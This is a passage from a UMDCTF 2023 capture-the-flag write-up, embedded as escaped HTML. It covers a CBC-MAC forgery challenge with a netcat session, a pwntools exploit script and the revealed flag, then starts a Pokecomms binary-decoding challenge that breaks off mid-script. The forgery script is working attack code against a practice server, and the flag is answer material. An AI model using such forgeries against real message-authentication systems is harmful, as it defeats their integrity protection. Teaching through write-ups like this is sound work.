&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;AF_INET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;SOCK_STREAM) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;s:
&lt;&#x2F;span&gt;&lt;span&gt;        s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setsockopt&lt;&#x2F;span&gt;&lt;span&gt;(socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;SOL_SOCKET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;socket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;SO_REUSEADDR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bind&lt;&#x2F;span&gt;&lt;span&gt;((HOST&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;PORT))
&lt;&#x2F;span&gt;&lt;span&gt;        s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;listen&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            conn, addr &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;accept&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;new connection: &lt;&#x2F;span&gt;&lt;span&gt;{addr}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;start_new_thread&lt;&#x2F;span&gt;&lt;span&gt;(threading&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;        s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The remote challenge is at &lt;strong&gt;nc 0.cloud.chals.io 12769&lt;&#x2F;strong&gt;. The challenges is Generating a &lt;strong&gt;Message Authentication Code [Tag]&lt;&#x2F;strong&gt; For the given input message. The message should be in hex format and the length of the message has to be multiple of 16.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;cbc0mac1$&lt;&#x2F;span&gt;&lt;span&gt; nc 0.cloud.chals.io 12769
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Team&lt;&#x2F;span&gt;&lt;span&gt; Rocket told me CBC-MAC with arbitrary-length messages is safe from forgery. If you manage to forge a message you haven&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;t queried using my oracle, I&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;ll give you something in return.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;What&lt;&#x2F;span&gt;&lt;span&gt; would you like to do&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) MAC Query
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) Forgery
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;) Exit
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Choice:&lt;&#x2F;span&gt;&lt;span&gt; 1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt; (hex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; 6162636465666768696a6b6c6d6e6f70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;CBC-MAC&lt;&#x2F;span&gt;&lt;span&gt;(msg)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; f670f2abb9159a15a82a5779adbfb7bc
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;What&lt;&#x2F;span&gt;&lt;span&gt; would you like to do&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) MAC Query
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) Forgery
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;) Exit
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Choice:&lt;&#x2F;span&gt;&lt;span&gt; 1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt; (hex)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; 6162636465666768696a6b6c6d6e6f706162636465666768696a6b6c6d6e6f70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;CBC-MAC&lt;&#x2F;span&gt;&lt;span&gt;(msg)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt; 2836413262109e028fe4e00452f60f53
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;What&lt;&#x2F;span&gt;&lt;span&gt; would you like to do&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;?
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) MAC Query
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;) Forgery
&lt;&#x2F;span&gt;&lt;span&gt;	(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;) Exit
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Choice: 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The program is taking the variable length message as input, this is a flag in cbc-mac.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_cbcmac11.png&quot; alt=&quot;cbcmac11&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, The MAC or Tag is the last encrypted plaintext in the CBC Mode of AES. As the program allowing us to input variable length message we can generate a new message &lt;code&gt;M2&lt;&#x2F;code&gt; with the same tag &lt;code&gt;t1&lt;&#x2F;code&gt; which is the tag of &lt;code&gt;M1&lt;&#x2F;code&gt;. To do this I choosed &lt;code&gt;M2&lt;&#x2F;code&gt; with 2 blocks of plaintext with 16 characters each. The &lt;code&gt;new_M2 = (last block of M2) xor t1&lt;&#x2F;code&gt;  This &lt;code&gt;new_M2&lt;&#x2F;code&gt; will have the same tag &lt;code&gt;t1&lt;&#x2F;code&gt;. This is how we can forge the message. Here is the automated script for the challenge.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;strxor &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;strxor
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;conn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;remote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;0.cloud.chals.io&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12769&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Choice: &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;msg (hex): &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;m1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;abcdefghijklmnop&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;m2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyz123456&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;m1_hex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(c))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;m1)
&lt;&#x2F;span&gt;&lt;span&gt;m2_hex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(c))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;m2)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(m1_hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;(msg): &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;tag1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvline&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strxor&lt;&#x2F;span&gt;&lt;span&gt;(m2_hex[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;tag1)
&lt;&#x2F;span&gt;&lt;span&gt;new_m2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;m2_hex[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Choice: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;msg (hex): &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(new_m2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recvuntil&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;tag (hex): &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendline&lt;&#x2F;span&gt;&lt;span&gt;(tag1)
&lt;&#x2F;span&gt;&lt;span&gt;flag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(flag)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : UMDCTF{Th!s_M@C_Sch3M3_1s_0nly_S3cur3_f0r_f!xed_l3ngth_m3ss4g3s_78232813}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;pokecomms&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#pokecomms&quot; aria-label=&quot;Anchor link for: pokecomms&quot;&gt;Pokecomms&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;umd23&#x2F;umdctf23_pokecomms.png&quot; alt=&quot;pokecomms&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The challenge had this txt file.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt; CHU! PIKA CHU! PIKA CHU! PIKA CHU! PIKA
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! CHU! PIKA PIKA CHU! PIKA
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! CHU! CHU! PIKA CHU! CHU!
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! CHU! CHU! CHU! PIKA PIKA
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! PIKA CHU! PIKA CHU! CHU!
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! CHU! CHU! PIKA PIKA CHU!
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA PIKA PIKA PIKA CHU! PIKA PIKA
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! PIKA CHU! CHU! CHU! CHU!
&lt;&#x2F;span&gt;&lt;span&gt; CHU! CHU! PIKA PIKA CHU! CHU! CHU! PIKA
&lt;&#x2F;span&gt;&lt;span&gt; CHU! PIKA CHU! CHU! PIKA CHU! PIKA PIKA
&lt;&#x2F;span&gt;&lt;span&gt; CHU! CHU! PIKA PIKA CHU! PIKA CHU! CHU!
&lt;&#x2F;span&gt;&lt;span&gt; .
&lt;&#x2F;span&gt;&lt;span&gt; .
&lt;&#x2F;span&gt;&lt;span&gt; CHU! CHU! PIKA PIKA CHU! PIKA CHU! CHU!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The first thing I did is eliminated the duplicate lines in text file. Then I saw that there are only 8 words in every line. And the The words are only CHU! PIKA with random sequence. So, I changed CHU! to 1 and PIKA to 0. Got the binary bits then converted it to ascii to get the flag.&lt;&#x2F;p&gt;
&lt;p&gt;The solution script is&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pokecomms.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:
&lt;&#x2F;span&gt;&lt;span&gt;    l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;m &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
